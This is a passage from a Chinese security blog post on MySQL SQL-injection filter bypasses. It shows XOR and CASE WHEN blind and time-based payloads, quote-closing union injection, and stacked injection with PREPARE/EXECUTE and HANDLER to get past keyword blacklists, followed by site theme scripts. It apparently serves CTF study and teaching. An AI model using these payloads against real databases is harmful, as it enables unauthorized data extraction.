+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">0</span> <span class="operator">||</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="operator">&amp;&amp;</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>若<code>||</code>、<code>&amp;&amp;</code>也被过滤了，可以使用异或<code>^</code></p>
+<p>MySQL中没有布尔类型，真为1，假为0</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test <span class="keyword">WHERE</span> <span class="number">1</span> <span class="operator">^</span> (ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span>)</span><br><span class="line"># 真 <span class="number">1</span><span class="operator">^</span><span class="number">1</span><span class="operator">=</span><span class="number">0</span> 返回空</span><br><span class="line"># 假 <span class="number">1</span><span class="operator">^</span><span class="number">0</span><span class="operator">=</span><span class="number">1</span> 全返回</span><br></pre></td></tr></table></figure>
+
+<h2 id="if过滤"><a href="#if过滤" class="headerlink" title="if过滤"></a>if过滤</h2><p><code>case when then else end</code>代替，或者多个and(前面的语句为真才会执行后面的)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> if(hex(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="string">&#x27;40&#x27;</span>,sleep(<span class="number">2</span>),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">SELECT</span> hex(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="string">&#x27;40&#x27;</span> <span class="keyword">and</span> sleep(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">case</span> <span class="keyword">when</span> hex(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="string">&#x27;40&#x27;</span> <span class="keyword">then</span> sleep(<span class="number">2</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="注释符过滤"><a href="#注释符过滤" class="headerlink" title="注释符过滤"></a>注释符过滤</h2><p>MySQL可以用<code>-- </code>(后面跟着空格)代替<code>#</code></p>
+<p>如果注入点在SQL语句末尾，可以尝试闭合最后的引号(当然如果是数值型注入就不用考虑闭合了)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;3&#x27;</span></span><br><span class="line"># id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><p>如过滤<code>union</code>、<code>select</code>、<code>where</code>、<code>from</code>这些关键字</p>
+<p>若WAF没有强转大写或小写，可以试试大小写绕过。不然就得看有没有堆叠注入了。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure>
+
+<p>可参考2019强网杯——随便注</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lilongsy/article/details/108596757">https://blog.csdn.net/lilongsy/article/details/108596757</a></p>
+<p>堆叠注入配合预编译SQL</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;use information_schema;set @sql=concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect column_name <span class="keyword">from</span> columns wher<span class="string">&#x27;,&#x27;</span>e table_name<span class="operator">=</span>&quot;xxx&quot;<span class="string">&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@x</span><span class="operator">=</span><span class="number">0x31</span>;<span class="keyword">Prepare</span> a <span class="keyword">from</span> &quot;select balabala from table1 where 1=?&quot;;<span class="keyword">Execute</span> a <span class="keyword">using</span> <span class="variable">@x</span>;</span><br></pre></td></tr></table></figure>
+
+<p>或者用handler</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">handler <span class="keyword">user</span> <span class="keyword">OPEN</span> <span class="keyword">as</span> a1;</span><br><span class="line">handler a1 read <span class="keyword">first</span>;</span><br><span class="line">handler a1 read next;</span><br><span class="line">handler a1 read next;</span><br><span class="line">handler a1 <span class="keyword">CLOSE</span>;</span><br></pre></td></tr></table></figure>
+
+<p>MySQL8.0.19之后可以使用新的语法来替代select</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">table</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">VALUES</span> <span class="type">ROW</span>(&quot;Black&quot;, &quot;Cat&quot;), <span class="type">ROW</span>(&quot;Yellow&quot;, &quot;Dog&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+</span><br><span class="line">| column_0 | column_1 |</span><br><span class="line">+----------+----------+</span><br><span class="line">| Black    | Cat      |</span><br><span class="line">| Yellow   | Dog      |</span><br><span class="line">+----------+----------+</span><br></pre></td></tr></table></figure>
+
+<h2 id="等价函数"><a href="#等价函数" class="headerlink" title="等价函数"></a>等价函数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() <span class="operator">-</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">concat_ws() <span class="operator">-</span><span class="operator">&gt;</span> group_concat()   # CONCAT_WS(separator,str1,str2,...)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Articles-To-Learn"><a href="#Articles-To-Learn" class="headerlink" title="Articles To Learn"></a>Articles To Learn</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d10785d22db2">https://www.jianshu.com/p/d10785d22db2</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/13019703.html">https://www.cnblogs.com/forforever/p/13019703.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Vinson404/p/7253255.html">https://www.cnblogs.com/Vinson404/p/7253255.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html">https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html</a></li>
+</ul>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/08/01/ysomap-2/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-02-16 10:29:34
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/security/" title="security">
+                        #security
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/sqli/" title="sqli">
+                        #sqli
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/09/24/frp/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Order-By%E7%9B%B2%E6%B3%A8"><span class="toc-text">Order By盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-text">黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#substr%E8%BF%87%E6%BB%A4"><span class="toc-text">substr过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">逗号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-text">空格过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">引号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AF%94%E8%BE%83%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-text">比较符过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-text">逻辑符过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#if%E8%BF%87%E6%BB%A4"><span class="toc-text">if过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-text">注释符过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">关键字过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0"><span class="toc-text">等价函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Articles-To-Learn"><span class="toc-text">Articles To Learn</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + SQL%20injection%20Black%20Magic + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F08%2F05%2Fsqli%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/08/05/sqli/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,d=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=o());for(var e,i=0;i<d.length;i++)0<=(e=(e=d[i]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,a,n,o=d[i];e=function(){d=d.filter(function(t){return o!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(o)},(t=o).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,n=t.getAttribute("data-original"),a.onload=function(){t.src=n,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=n},t.src!==n&&(a.src=n)))}()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)}(this);</script></body>
+</html>
